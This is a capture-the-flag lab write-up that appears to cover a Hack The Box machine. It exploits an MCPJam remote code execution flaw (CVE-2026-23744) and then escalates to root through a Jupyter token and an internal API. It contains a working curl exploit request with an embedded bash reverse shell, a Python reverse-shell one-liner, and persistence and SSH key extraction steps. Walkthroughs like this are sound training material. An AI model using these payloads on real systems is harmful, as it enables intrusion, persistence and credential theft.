### 1. Overview
This machine involved exploiting an unauthenticated remote code execution vulnerability (CVE-2026-23744) in MCPJam to gain an initial shell. After accessing the system, an internal Jupyter Server was discovered, and a recovered access token was used to execute a Python reverse shell as the `analyst` user. Privilege escalation was achieved by port-forwarding a locally hosted internal API, which contained hardcoded credentials, to extract the root SSH private key and gain full system access.
### 2. Recon
Starting off this machine, I ran the standard Nmap service and port scan:
```
╰─❯ nmap -sCV 10.129.5.207 --min-rate 5000 -oN devhub.nmap
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

The scan found 2 ports:
- **22 SSH**
- **80 HTTP**

The scan also found the domain `devhub.htb`. Upon going to the website, I discovered port `6274` was open and hosting MCP Inspector. I identified the current version of MCPJam through the application settings:
```
MCPJam Version: v1.4.2
```

This version of MCPJam is vulnerable to `CVE-2026-23744`.

### 3. Foothold
The vulnerability exists due to the server processing a malicious HTTP request without validating the source or requiring authentication, allowing arbitrary MCP server installations that can execute code on the underlying system.

To exploit this vulnerability, I first set up a netcat listener:
```
╰─❯ nc -lvnp 9001
```

Then I sent the malicious HTTP request to trigger the exploit:
```
╰─❯ curl http://10.129.5.207:6274/api/mcp/connect --header "Content-Type: application/json" --data '{"serverConfig":{"command":"/bin/bash","args":["-c", "bash -i >& /dev/tcp/10.10.14.81/9001 0>&1"],"env":{}},"serverId":"mytest"}'
```

This resulted in a reverse shell as the user `mcp-dev`.

During internal enumeration, I found an internal service being hosted on port `8888`:
```
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ ss -tulnp
Netid State  Recv-Q Send-Q Local Address:Port
tcp   LISTEN 0      128        127.0.0.1:8888
```

I used `chisel` to port forward this service back to my local machine. To access the web interface, which was running a Jupyter Server, I needed to locate an authentication token. I found this by reviewing running processes:
```
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ ps auxww | grep -i jupyter
analyst     1101  0.0  2.6 484716 106492 ?       Ssl  20:04   0:05 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
```

Now that I had the token, I logged into JupyterLab on port `8888`. This provided an environment to execute arbitrary Python scripts.

To execute code on this instance, I used the JupyterLab web interface:
1. Click on the **Python 3 (ipykernel)** button under **Console**
2. Execute python code

To gain a shell as the `analyst` user, I used a Python reverse shell payload, modifying it to remove the bash dependencies:
```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.81",9003));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

After running this script, I obtained a reverse shell as the `analyst` user and established persistence by adding my SSH key to their `authorized_keys` file.

### 5. Overview
Initial access was gained by identifying an exposed MCP Inspector service on port 6274 and exploiting a known unauthenticated command execution vulnerability (CVE-2026-23744) in MCPJam. Once on the machine as `mcp-dev`, an internal JupyterLab instance running on port 8888 was port-forwarded. Using a token recovered from running processes, authentication was bypassed, and a Python reverse shell was executed to pivot to the `analyst` user.

During privilege escalation enumeration, a custom Python service was found listening locally on port 5000. By analyzing the source code, a hardcoded API key was recovered along with a hidden administrative function designed to dump SSH keys. After forwarding the port via SSH, a crafted POST request was sent to extract the root user's `id_rsa` key, resulting in full administrative access.
